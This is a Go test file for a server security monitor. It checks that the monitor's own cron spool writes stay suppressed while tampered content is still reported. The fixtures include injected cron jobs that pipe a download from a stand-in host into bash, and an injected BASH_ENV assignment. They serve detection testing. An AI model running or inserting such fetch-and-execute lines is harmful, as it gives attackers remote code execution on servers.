package checks

import (
	"path/filepath"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/state"
)

// CSM's own writes must never be the thing that raises a finding. The in-memory
// ledger expires after 15 minutes and is lost on restart, and a cPanel crontab
// wrapper rewrites the spool file (adding SHELL=, dropping comments) after CSM
// hands it over, so the structural recognizer cannot always vouch for the
// result either. The durable record keeps the suppression content-bound: the
// exact bytes CSM wrote stay suppressed, anything else is reported.

func newSelfWriteTestStore(t *testing.T) *state.Store {
	t.Helper()
	st, err := state.Open(filepath.Join(t.TempDir(), "state.json"))
	if err != nil {
		t.Fatalf("state.Open: %v", err)
	}
	return st
}

// withExpiredMemoryLedger runs fn with the in-memory ledger aged past its TTL,
// which is what a daemon restart leaves behind.
func withExpiredMemoryLedger(t *testing.T, fn func()) {
	t.Helper()
	orig := selfWriteNow
	selfWriteNow = func() time.Time { return orig().Add(2 * selfWriteTTL) }
	defer func() { selfWriteNow = orig }()
	fn()
}

func TestSelfWriteSurvivesLedgerExpiry(t *testing.T) {
	st := newSelfWriteTestStore(t)
	SetSelfWriteStore(st)
	defer SetSelfWriteStore(nil)

	path := "/var/spool/cron/testuser"
	content := []byte("SHELL=\"/usr/local/cpanel/bin/jailshell\"\n* * * * * true\n")
	RecordSelfWrite(path, content)

	withExpiredMemoryLedger(t, func() {
		if !isExpectedSelfWrite(path, content) {
			t.Error("CSM's own write should stay suppressed after the in-memory ledger expires")
		}
	})
}

func TestSelfWriteDurableRecordStillRejectsTamper(t *testing.T) {
	st := newSelfWriteTestStore(t)
	SetSelfWriteStore(st)
	defer SetSelfWriteStore(nil)

	path := "/var/spool/cron/testuser"
	RecordSelfWrite(path, []byte("* * * * * true\n"))

	withExpiredMemoryLedger(t, func() {
		tampered := []byte("* * * * * true\n* * * * * curl http://198.51.100.9/x | bash\n")
		if isExpectedSelfWrite(path, tampered) {
			t.Error("content layered on top of CSM's write must still be reported")
		}
	})
}

func TestForgetSelfWritesClearsDurableRecord(t *testing.T) {
	st := newSelfWriteTestStore(t)
	SetSelfWriteStore(st)
	defer SetSelfWriteStore(nil)

	path := "/var/spool/cron/testuser"
	content := []byte("* * * * * true\n")
	RecordSelfWrite(path, content)
	forgetSelfWrites(path)

	withExpiredMemoryLedger(t, func() {
		if isExpectedSelfWrite(path, content) {
			t.Error("a forgotten self-write must not stay suppressed durably")
		}
	})
}

// Without a store configured the ledger must still work in memory and must not
// panic, so unit tests and one-shot CLI runs behave as before.
func TestSelfWriteWithoutStoreStaysInMemory(t *testing.T) {
	SetSelfWriteStore(nil)
	path := "/var/spool/cron/nostore"
	content := []byte("* * * * * true\n")
	RecordSelfWrite(path, content)
	if !isExpectedSelfWrite(path, content) {
		t.Error("in-memory suppression must work without a durable store")
	}
	withExpiredMemoryLedger(t, func() {
		if isExpectedSelfWrite(path, content) {
			t.Error("without a store the record must still expire with the TTL")
		}
	})
}

// The cPanel crontab wrapper rewrites the spool file after `crontab -u` -- it
// prepends SHELL= and drops comments -- so a byte comparison against the staged
// buffer fails and CSM used to discard its own self-write record entirely. The
// result is on-disk content CSM caused, so it must still be recorded, while a
// job line that appeared from nowhere must not be vouched for.
func TestCrontabExplainedByAcceptsWrapperRewrite(t *testing.T) {
	expected := []byte("# CSM WP-Cron /home/u/public_html\n" +
		"7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n" +
		"0 */4 * * * /usr/local/bin/php /home/u/site/cron/import-feeds.php\n")
	onDisk := []byte("SHELL=\"/usr/local/cpanel/bin/jailshell\"\n" +
		"7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n" +
		"0 */4 * * * /usr/local/bin/php /home/u/site/cron/import-feeds.php\n")
	if !crontabExplainedBy(onDisk, expected) {
		t.Error("wrapper-rewritten crontab should still be recognized as CSM's own write")
	}
}

func TestCrontabExplainedByRejectsInjectedJob(t *testing.T) {
	expected := []byte("7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n")
	onDisk := append(append([]byte{}, expected...),
		[]byte("* * * * * curl -s http://198.51.100.9/x.sh | bash\n")...)
	if crontabExplainedBy(onDisk, expected) {
		t.Error("a job line CSM never wrote must not be vouched for as a self-write")
	}
}

func TestCrontabExplainedByRejectsUnsafeEnvAssignment(t *testing.T) {
	expected := []byte("7-59/15 * * * * cd '/home/u/public_html' && flock -n \"$HOME/.csm-wpcron-0dc0353a.lock\" '/usr/local/bin/php' -d max_execution_time=300 wp-cron.php >/dev/null 2>&1\n")
	onDisk := append([]byte("BASH_ENV=/tmp/.evil\n"), expected...)
	if crontabExplainedBy(onDisk, expected) {
		t.Error("an injected environment assignment must not be treated as a wrapper rewrite")
	}
}
